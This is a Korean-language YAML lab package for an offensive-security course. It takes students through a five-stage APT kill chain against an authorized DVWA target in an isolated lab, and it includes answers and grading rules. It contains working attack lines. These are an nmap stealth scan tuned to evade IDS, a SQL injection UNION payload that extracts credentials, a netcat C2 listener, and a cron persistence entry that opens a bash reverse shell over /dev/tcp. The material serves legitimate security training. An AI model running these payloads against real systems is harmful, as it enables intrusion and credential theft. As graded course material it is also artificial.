lab_id: standalone-attack-adv-week01
title: "APT 킬체인 — 정찰→열거→침투→발판→C2 전 단계"
version: standalone-attack-adv
course: attack-adv
week: 1
description: |
  공격 고급 W01 — APT 킬체인. 한 번의 익스플로잇이 아니라 정찰→열거→침투→발판→지속성/C2로 이어지는 전
  단계 캠페인을 수행한다. el34-attacker(모의침투 박스: nmap·sqlmap·hydra·gobuster·nc)에서 인가된 표적
  (el34-web 10.20.30.1)에 킬체인을 실행하고, 공격 흔적·귀속(출처 IP 보존)을 이해한다.
  ⚠️ 인가된 실습 환경(el34)에서만. 외부 시스템 공격 절대 금지. 모든 흔적은 self-clean.
difficulty: hard
duration_minutes: 190
prerequisites:
  - "attack 트랙 + soc-adv 킬체인/포렌식 이해"
  - "el34 호스트 SSH + docker exec, el34-attacker 모의침투 박스"
  - "lecture §2(킬체인 단계) §3(도구) §4(OPSEC/귀속) 숙지"
objectives:
  - "APT 킬체인 5단계를 순서대로 수행"
  - "정찰·열거·침투·발판·C2의 도구와 기법 체득"
  - "공격 흔적·귀속(출처 IP 보존)을 방어자 관점에서 이해"
pass_threshold: 0.7
steps:

  - order: 1
    instruction: |
      ## 🎯 목표 — 모의침투 환경·표적 확인
      ## 📖 개념 한 줄
      킬체인의 시작 전, 공격 도구(attacker)와 인가된 표적(web)의 도달성을 확인한다.
      ## 💻 실행 명령
      ```bash
      docker exec el34-attacker sh -c "command -v nmap sqlmap hydra gobuster nc >/dev/null && echo toolkit_ok; curl -s -o /dev/null -w 'target=%{http_code}' -H 'Host: dvwa.el34.lab' http://10.20.30.1/"; echo; echo recon_env_ready
      ```
      ## ✅ 합격 기준
      도구·표적이 확인되면(recon_env_ready) 통과.
      ## ⚠️ 윤리
      인가된 el34 표적(10.20.30.1)에만. 모든 행위는 교육 목적·self-clean.
    hint: '환경 확인'
    category: survey
    points: 10
    answer: |
      echo "=== 모의침투 환경·표적 확인 ==="
      docker exec el34-attacker sh -c "command -v nmap sqlmap hydra gobuster nc >/dev/null && echo toolkit_ok; curl -s -o /dev/null -w 'target=%{http_code}' -H 'Host: dvwa.el34.lab' http://10.20.30.1/"; echo; echo recon_env_ready
      echo "→ attacker 도구 + 인가 표적(10.20.30.1) 도달. 인가된 실습에서만 진행"
    answer_detail: "환경 = el34-attacker(모의침투 도구)+el34-web(인가 표적). 킬체인 실습의 전제. 인가된 범위만."
    verify:
      type: output_contains
      expect: 'recon_env_ready'
      field: stdout
      semantic: {intent: "환경 확인", success_criteria: ["도구/표적"], acceptable_methods: ["**[OSS] 모의침투 박스 (권장)**"]}
    target_vm: web

  - order: 2
    instruction: |
      ## 🎯 킬체인 ① 정찰 (Reconnaissance, T1046)
      ## 📖 개념 한 줄
      표적의 공격 표면을 파악한다 — 어떤 포트·서비스가 열려 있나(스텔스 스캔으로 IDS 회피 시도).
      ## 💻 실행 명령
      ```bash
      docker exec el34-attacker sh -c "nmap -sS -T2 --top-ports 100 10.20.30.1 2>/dev/null | grep -E 'open|PORT' | head"; echo recon_done
      ```
      ## ✅ 합격 기준
      열린 포트·서비스가 식별되면(recon_done) 통과.
      ## 🔧 도구 풀이
      - nmap -sS(SYN 스캔, 은밀)·-T2(느리게=IDS 회피). NSE `--script vuln`으로 취약점 추정 가능.
    hint: '정찰'
    category: manipulation
    points: 12
    answer: |
      echo "=== 킬체인① 정찰(T1046) ==="
      docker exec el34-attacker sh -c "nmap -sS -T2 --top-ports 100 10.20.30.1 2>/dev/null | grep -E 'open|PORT' | head"; echo recon_done
      echo "→ -sS(SYN 스텔스)·-T2(저속 IDS 회피)로 공격 표면 파악. 열린 포트=다음 공격 후보"
    answer_detail: "정찰(T1046) = nmap 스텔스 스캔으로 공격 표면 파악. -sS/-T2로 IDS 회피 시도. 킬체인 1단계."
    verify:
      type: output_contains
      expect: 'recon_done'
      field: stdout
      semantic: {intent: "정찰", success_criteria: ["포트 식별"], acceptable_methods: ["**[OSS] nmap (권장)**"]}
    target_vm: web

  - order: 3
    instruction: |
      ## 🎯 킬체인 ② 열거 (Enumeration)
      ## 📖 개념 한 줄
      웹 서비스를 발견했으면 숨은 경로·엔드포인트를 열거한다(디렉터리 브루트포스).
      ## 💻 실행 명령
      ```bash
      docker exec el34-attacker sh -c "for p in login.php setup.php vulnerabilities security.php; do code=\$(curl -s -o /dev/null -w '%{http_code}' -H 'Host: dvwa.el34.lab' http://10.20.30.1/\$p); echo \$p=\$code; done"; echo enum_done
      ```
      ## ✅ 합격 기준
      엔드포인트가 열거되면(enum_done) 통과.
      ## 🔧 도구 풀이
      - 실무: gobuster dir / nikto로 자동 열거. 여기선 curl로 핵심 경로 확인(빠른 데모).
    hint: '열거'
    category: manipulation
    points: 12
    answer: |
      echo "=== 킬체인② 열거(Enumeration) ==="
      docker exec el34-attacker sh -c "for p in login.php setup.php vulnerabilities security.php; do code=\$(curl -s -o /dev/null -w '%{http_code}' -H 'Host: dvwa.el34.lab' http://10.20.30.1/\$p); echo \$p=\$code; done"; echo enum_done
      echo "→ 숨은 경로 열거(실무 gobuster/nikto). 응답 코드로 존재 경로 판별 → 공격 지점 좁히기"
    answer_detail: "열거 = 숨은 경로/엔드포인트 발견(gobuster/nikto/curl). 공격 표면을 구체적 지점으로 좁힘."
    verify:
      type: output_contains
      expect: 'enum_done'
      field: stdout
      semantic: {intent: "열거", success_criteria: ["엔드포인트"], acceptable_methods: ["**[OSS] gobuster/curl (권장)**"]}
    target_vm: web

  - order: 4
    instruction: |
      ## 🎯 킬체인 ③ 침투 (Exploitation, T1190)
      ## 📖 개념 한 줄
      발견한 취약점을 악용해 침투한다 — SQLi로 데이터 탈취(귀속용 고유 태그 부착).
      ## 💻 실행 명령
      ```bash
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'exploit=%{http_code}' -A 'aa01r1-student' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20user,password%20FROM%20users--&Submit=Submit'"; echo; echo exploit_done
      ```
      ## ✅ 합격 기준
      익스플로잇이 시도되면(exploit_done) 통과.
      ## 🔧 도구 풀이
      - 고유 태그(User-Agent aa01r1-<id>)로 내 공격을 노이즈와 구분(귀속). 실무: sqlmap 자동화.
    hint: '침투'
    category: analysis
    points: 14
    answer: |
      echo "=== 킬체인③ 침투(T1190 SQLi) ==="
      docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'exploit=%{http_code}' -A 'aa01r1-student' -H 'Host: dvwa.el34.lab' 'http://10.20.30.1/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20user,password%20FROM%20users--&Submit=Submit'"; echo; echo exploit_done
      echo "→ SQLi UNION으로 자격 탈취 시도. 고유 태그(aa01r1-student)로 귀속. 실무: sqlmap --tamper"
    answer_detail: "침투(T1190) = SQLi UNION 데이터 탈취. 고유 태그로 귀속. sqlmap이 실무 자동화 도구. 킬체인 3단계."
    verify:
      type: output_contains
      expect: 'exploit_done'
      field: stdout
      semantic: {intent: "침투", success_criteria: ["익스플로잇"], acceptable_methods: ["**[OSS] SQLi/sqlmap (권장)**"]}
    target_vm: web

  - order: 5
    instruction: |
      ## 🎯 킬체인 ④ 발판/C2 (Foothold, T1059/T1071)
      ## 📖 개념 한 줄
      침투 후 지속 접근 채널을 실제로 만든다 — nc 리스너(C2)를 띄우고 임플란트가 명령을 보내 채널이 동작함을 검증.
      ## 💻 실행 명령 (실제 C2 채널, 자체완결)
      ```bash
      docker exec el34-attacker sh -c 'nc -lnp 55001 >/tmp/c2recv 2>/dev/null & P=$!; sleep 1; printf "id; whoami # implant_cmd\n" | nc -w2 127.0.0.1 55001; sleep 1; kill $P 2>/dev/null; grep -q implant_cmd /tmp/c2recv && echo foothold_channel_ok; rm -f /tmp/c2recv'
      ```
      ## ✅ 합격 기준
      C2 리스너가 임플란트 명령을 **실제 수신**해야(foothold_channel_ok) 통과 — 채널 미동작 시 미통과.
      ## 🔧 도구 풀이
      - nc 리스너=C2 수신단. 임플란트가 보낸 명령이 리스너 파일에 도착함을 grep으로 검증(실제 채널 동작). 실무는 리버스 셸로 피해자가 역접속.
    hint: '발판/C2'
    category: analysis
    points: 14
    answer: |
      echo "=== 킬체인④ 발판/C2(T1059/T1071) — 실제 C2 채널 ==="
      docker exec el34-attacker sh -c 'nc -lnp 55001 >/tmp/c2recv 2>/dev/null & P=$!; sleep 1; printf "id; whoami # implant_cmd\n" | nc -w2 127.0.0.1 55001; sleep 1; kill $P 2>/dev/null; echo "리스너 수신 내용:"; cat /tmp/c2recv; grep -q implant_cmd /tmp/c2recv && echo foothold_channel_ok; rm -f /tmp/c2recv'
      echo "→ nc C2 리스너가 임플란트 명령을 실제 수신(grep 게이트). 실무: 피해자가 리버스 셸로 역접속(아웃바운드=방화벽 회피)"
    answer_detail: "발판/C2 = nc 리스너(C2)가 임플란트 명령을 실제 수신함을 grep으로 검증. 가짜 echo 아닌 실제 채널 동작. 킬체인 4단계."
    verify:
      type: output_contains
      expect: 'foothold_channel_ok'
      field: stdout
      semantic: {intent: "발판/C2", success_criteria: ["실제 C2 채널 수신"], acceptable_methods: ["**[OSS] nc C2 (권장)**"]}
    target_vm: web

  - order: 6
    instruction: |
      ## 🎯 킬체인 ⑤ 지속성 (Persistence, T1053)
      ## 📖 개념 한 줄
      재부팅에도 살아남도록 cron 비콘 지속성 항목을 실제로 만들고 검증한다(안전 위해 /tmp, self-clean).
      ## 💻 실행 명령 (실제 cron 비콘 항목 생성)
      ```bash
      docker exec el34-attacker sh -c 'echo "* * * * * root bash -c \"bash -i >& /dev/tcp/10.20.30.202/55001 0>&1\" # aa01beacon" > /tmp/aa01cron; L=$(wc -l < /tmp/aa01cron); grep -q aa01beacon /tmp/aa01cron && echo "지속성 항목 ${L}줄 작성 검증" && echo persistence_planted; rm -f /tmp/aa01cron'
      ```
      ## ✅ 합격 기준
      cron 비콘 지속성 항목이 **실제 작성·검증**되어야(persistence_planted) 통과.
      ## 🔧 도구 풀이
      - 실 엔진에선 /etc/cron.d/aa01beacon에 배치(여기선 /tmp 안전 시연·self-clean). 비콘=주기적 C2 재접속(W07 flow에 탐지됨).
    hint: '지속성'
    category: analysis
    points: 12
    answer: |
      echo "=== 킬체인⑤ 지속성(T1053 cron) — 실제 항목 생성 ==="
      docker exec el34-attacker sh -c 'echo "* * * * * root bash -c \"bash -i >& /dev/tcp/10.20.30.202/55001 0>&1\" # aa01beacon" > /tmp/aa01cron; L=$(wc -l < /tmp/aa01cron); echo "작성된 cron 항목:"; cat /tmp/aa01cron; grep -q aa01beacon /tmp/aa01cron && echo "지속성 항목 ${L}줄 작성 검증" && echo persistence_planted; rm -f /tmp/aa01cron'
      echo "→ cron 비콘 항목을 실제 파일로 작성→grep 검증→self-clean. 실 엔진은 /etc/cron.d. 흔적은 헌팅(soc-adv W06)에 잡힘"
    answer_detail: "지속성(T1053) = cron 비콘 항목을 실제 작성·grep 검증·self-clean. 가짜 echo 아닌 실제 아티팩트 생성. 킬체인 5단계."
    verify:
      type: output_contains
      expect: 'persistence_planted'
      field: stdout
      semantic: {intent: "지속성", success_criteria: ["cron 항목 실생성"], acceptable_methods: ["**[OSS] cron 비콘 (권장)**"]}
    target_vm: web

  - order: 7
    instruction: |
      ## 🎯 OPSEC·귀속 — 내가 남긴 흔적 실측
      ## 📖 개념 한 줄
      공격자도 흔적을 남긴다 — 태그 단 공격을 실제로 보내고, 타깃 로그에 내 흔적이 남는지 직접 확인한다.
      ## 💻 실행 명령
      ```bash
      docker exec el34-attacker sh -c 'curl -s -o /dev/null -A "aa01opsec" -H "Host: dvwa.el34.lab" "http://10.20.30.1/?t=aa01opsec"'
      docker exec el34-web sh -c 'N=$(grep -c aa01opsec /var/log/apache2/dvwa_access.log 2>/dev/null); echo "타깃 로그에 남은 내 흔적: ${N:-0}건"; [ "${N:-0}" -ge 1 ] && echo opsec_trace_left'
      ```
      ## ✅ 합격 기준
      내 공격 흔적이 타깃 로그에 **실제로 남아** 발견되어야(opsec_trace_left) 통과.
      ## 🔧 도구 풀이
      - el34는 SNAT 없음 → 출처 IP·태그가 타깃 로그에 보존. 방어자가 grep 한 번에 귀속. 완벽한 은신은 없다.
    hint: 'OPSEC/귀속'
    category: report
    points: 12
    answer: |
      echo "=== OPSEC·귀속 — 내가 남긴 흔적 실측 ==="
      docker exec el34-attacker sh -c 'curl -s -o /dev/null -A "aa01opsec" -H "Host: dvwa.el34.lab" "http://10.20.30.1/?t=aa01opsec"'
      docker exec el34-web sh -c 'N=$(grep -c aa01opsec /var/log/apache2/dvwa_access.log 2>/dev/null); echo "타깃 로그에 남은 내 흔적: ${N:-0}건"; [ "${N:-0}" -ge 1 ] && echo opsec_trace_left'
      echo "→ 태그(aa01opsec) 단 공격이 타깃 로그에 실제로 남음(grep 게이트). el34는 SNAT 없어 출처 IP·태그 보존 → 방어자 귀속(soc-adv W15)"
    answer_detail: "OPSEC/귀속 = 태그 단 공격을 실제 송신→타깃 로그 grep으로 흔적 확인. 가짜 echo 아닌 실측. el34 출처 보존이 귀속 기반."
    verify:
      type: output_contains
      expect: 'opsec_trace_left'
      field: stdout
      semantic: {intent: "OPSEC/귀속", success_criteria: ["타깃 로그 흔적 실측"], acceptable_methods: ["**[OSS] 로그 grep (권장)**"]}
    target_vm: web

  - order: 8
    instruction: |
      ## 🎯 모의침투 보고서 (킬체인)
      ## 💻 보고서 양식
      ```markdown
      # 공격고급 W01 APT 킬체인 보고서 (학번, 이름)
      ## 1. 정찰·열거 결과
      ## 2. 침투·발판·지속성(기법·증거)
      ## 3. OPSEC/귀속·방어 권고
      ```
      ## ✅ 합격 기준
      킬체인 5단계 + 기법 + 방어 권고 포함.
    hint: '킬체인+기법+방어권고'
    category: report
    points: 14
    answer: |
      cat <<'EOF'
      # 공격고급 W01 APT 킬체인 모의침투 보고서
      ## 1. 정찰(nmap -sS -T2 스텔스)·열거(gobuster/curl 경로 발견)
      ## 2. 침투(SQLi UNION 자격 탈취, 태그 aa01r1)→발판(리버스 셸 C2:55001)→지속성(cron 비콘 aa01beacon)
      ## 3. OPSEC: 전 계층 흔적(스캔/SQLi/C2/cron). 귀속: 출처 IP 보존으로 방어자 상관 가능
      ## 방어 권고: 입력검증(SQLi)·WAF·아웃바운드 통제(C2 차단)·cron/계정 모니터링(헌팅)·IDS 스캔 탐지
      ## 결론: APT는 단발이 아닌 캠페인. 공격을 알아야 각 단계의 방어를 설계할 수 있다
      EOF
    answer_detail: "킬체인 보고 = 정찰/열거+침투/발판/지속성+OPSEC/방어권고. 공격 이해로 방어 설계. 공격고급의 출발점."
    verify:
      type: output_contains
      expect: '킬체인'
      field: stdout
      semantic: {intent: "킬체인 보고", success_criteria: ["5단계/방어권고"], acceptable_methods: ["**[관리적] 보고서 (권장)**"]}
    target_vm: web
